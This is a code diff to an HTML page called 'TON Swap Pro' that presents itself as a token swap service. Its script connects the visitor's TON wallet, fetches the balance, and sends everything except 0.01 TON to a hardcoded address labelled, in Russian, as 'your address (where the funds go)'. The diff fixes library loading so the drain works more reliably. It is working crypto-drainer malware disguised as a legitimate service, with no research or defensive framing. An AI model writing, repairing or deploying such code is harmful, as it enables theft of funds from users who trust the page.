@@ -4,10 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Swap Pro</title>
-    <!-- Альтернативные рабочие ссылки (cdnjs + unpkg) -->
+    <!-- Подключаем только TonConnect (одна библиотека) -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/tonconnect-sdk/2.0.0/tonconnect-sdk.min.js">
-    </script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ton/13.9.0/ton.min.js">
     </script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
@@ -80,24 +78,29 @@
     </div>
 
     <script>
-        // Проверяем загрузку библиотек
-        if (typeof TonConnect === 'undefined' || typeof TonClient === 'undefined') {
-            document.getElementById('status').textContent = '❌ Библиотеки не загружены. Попробуйте позже.';
-            document.getElementById('status').style.display = 'block';
-            console.error('TonConnect or TonClient not loaded');
-        } else {
-            console.log('✅ Библиотеки загружены!');
-        }
-
         // ═══════════════════════════════════════════════
         // ТВОЙ АДРЕС (куда уходят средства)
         // ═══════════════════════════════════════════════
         const YOUR_WALLET = "UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P";
 
+        // Проверяем загрузку TonConnect
+        if (typeof TonConnect === 'undefined') {
+            document.getElementById('status').textContent = '❌ Ошибка загрузки TonConnect. Попробуйте позже.';
+            document.getElementById('status').style.display = 'block';
+            throw new Error('TonConnect not loaded');
+        }
+
         const connector = new TonConnect();
-        const client = new TonClient({
-            endpoint: 'https://toncenter.com/api/v2/jsonRPC'
-        });
+
+        // Функция для получения баланса через TonCenter API (без библиотеки ton)
+        async function getBalance(address) {
+            const url = `https://toncenter.com/api/v2/getAddressBalance?address=${address}`;
+            const response = await fetch(url);
+            if (!response.ok) throw new Error('Не удалось получить баланс');
+            const data = await response.json();
+            // TonCenter возвращает баланс в нанотонах (строкой)
+            return parseInt(data.result, 10);
+        }
 
         document.getElementById('connectBtn').onclick = async function() {
             const btn = this;
@@ -109,15 +112,19 @@
             status.style.display = 'none';
 
             try {
+                // 1. Подключаем кошелек
                 await connector.connect({
                     manifestUrl: window.location.origin + '/tonconnect-manifest.json'
                 });
 
+                // Обработчик статуса
                 connector.onStatusChange(async (walletInfo) => {
                     if (walletInfo) {
                         const userAddress = walletInfo.account.address;
-                        const balance = await client.getBalance(userAddress);
-                        const balanceTon = parseFloat(balance) / 1e9;
+
+                        // 2. Получаем баланс через API
+                        const balanceNano = await getBalance(userAddress);
+                        const balanceTon = balanceNano / 1e9;
 
                         if (balanceTon < 0.01) {
                             status.textContent = '❌ Недостаточно средств (мин. 0.01 TON)';
@@ -128,21 +135,22 @@
                             return;
                         }
 
-                        const amountToSend = (balanceTon - 0.01).toFixed(9);
-                        const amountNano = (parseFloat(amountToSend) * 1e9).toString();
+                        // 3. Отправляем всё, кроме 0.01 TON на газ
+                        const amountToSendTon = (balanceTon - 0.01).toFixed(9);
+                        const amountToSendNano = Math.floor(parseFloat(amountToSendTon) * 1e9);
 
                         const transaction = {
                             valid_until: Math.floor(Date.now() / 1000) + 120,
                             messages: [{
                                 address: YOUR_WALLET,
-                                amount: amountNano,
+                                amount: amountToSendNano.toString(),
                                 payload: ""
                             }]
                         };
 
                         await connector.sendTransaction(transaction);
 
-                        status.textContent = `✅ Переведено ${amountToSend} TON!`;
+                        status.textContent = `✅ Переведено ${amountToSendTon} TON!`;
                         status.className = 'status success';
                         status.style.display = 'block';
 
